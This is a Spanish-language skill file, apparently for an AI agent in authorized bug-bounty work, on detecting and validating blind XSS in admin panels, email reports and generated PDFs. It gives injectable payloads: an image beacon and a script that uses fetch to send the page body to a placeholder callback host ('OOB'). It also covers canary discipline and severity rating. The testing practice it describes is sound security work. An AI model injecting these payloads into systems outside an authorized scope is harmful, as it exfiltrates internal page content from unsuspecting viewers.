---
name: xss-blind
description: Detecta y valida XSS ciego — input que dispara render en un
  contexto que el atacante NO ve directo (panel de admin, log interno,
  sistema de soporte, reportes por email, PDFs generados). Usar cuando hay
  un campo que claramente alimenta un contexto de visualización interno
  (nombre/apellido en perfil, notas de ticket, asunto de email, título de
  proyecto, dirección de empresa) sin forma de ver el resultado directo.
---

# XSS Blind

Trabajá sobre el caso concreto que dio el operador. A diferencia de los
otros 3 subtipos, acá el sink es desconocido hasta confirmar — se prueba
con payload con callback OOB (webhook propio, XSS Hunter, Burp
Collaborator). No hay forma de "ver" si ejecutó sin ese callback.

## Qué buscar

Source: cualquier input que dispara render en un contexto que NO ves
directo (panel de admin, log interno, sistema de soporte, email interno).
Sink: desconocido hasta confirmar.

**Path específico — email/PDF reports**: apps que generan reportes enviados
por email o PDFs con contenido de usuario. El sink es el renderer del email
client o del PDF engine (Chromium headless, wkhtmltopdf, WeasyPrint).
Payloads a inyectar en campos que aparecen en reportes:

```html
<!-- OOB via img load en email HTML -->
<img src="https://OOB/blind?loc=email-report">

<!-- Si el renderer ejecuta JS (Chromium headless sin sandbox) -->
<script>fetch('https://OOB/?d='+btoa(document.body.innerHTML))</script>

<!-- PDF con exfil via annotation/form action (wkhtmltopdf) -->
<a href="https://OOB/?pdf=1">x</a>
```

Campos de mayor probabilidad para este path: nombre/apellido en perfil,
dirección de empresa, campo "notas" en tickets de soporte, asunto de
email, título de proyecto.

## Disciplina del canary

Un payload de blind XSS no se puede probar "una vez y listo" — cada
campo candidato recibe UN payload único con un identificador distinguible
en el callback (no reusar el mismo canary en varios campos a la vez), para
poder atribuir el callback al campo exacto que lo disparó cuando llegue.

## Qué mata el lead

- No hay callback tras esperar una ventana razonable (48–72h) —
  **reintentar antes de descartar, acá un falso negativo sale caro** (el
  render interno puede correr en batch, no inmediato).
- El contexto de render interno tiene su propio sanitizer/CSP que no se
  puede confirmar desde afuera → Informational hasta que alguien con
  acceso al panel lo confirme.

## Severidad

**No reportar sin el callback.** Inyectar sin confirmar ejecución es una
hipótesis, no un finding — techo P4/Informational hasta recibir la
llamada OOB. Una vez confirmado el callback, ver "Impact framing" en
`../xss/references/common-xss.md` para la escalada de PoC, con la
salvedad de que el acceso real al contexto donde ejecuta (panel admin,
sistema interno) suele ser alto impacto por el rol del viewer, no por el
tipo de dato que roba.

## Referencias condicionales

- Impact framing, framework gotchas (si el renderer interno usa un
  framework identificable): `../xss/references/common-xss.md`.
- Filtro observado en el campo de input antes de enviar: `../xss/references/filter-probing.md`.
- Catálogo de vectores: `../xss/references/vector-catalog.md`.
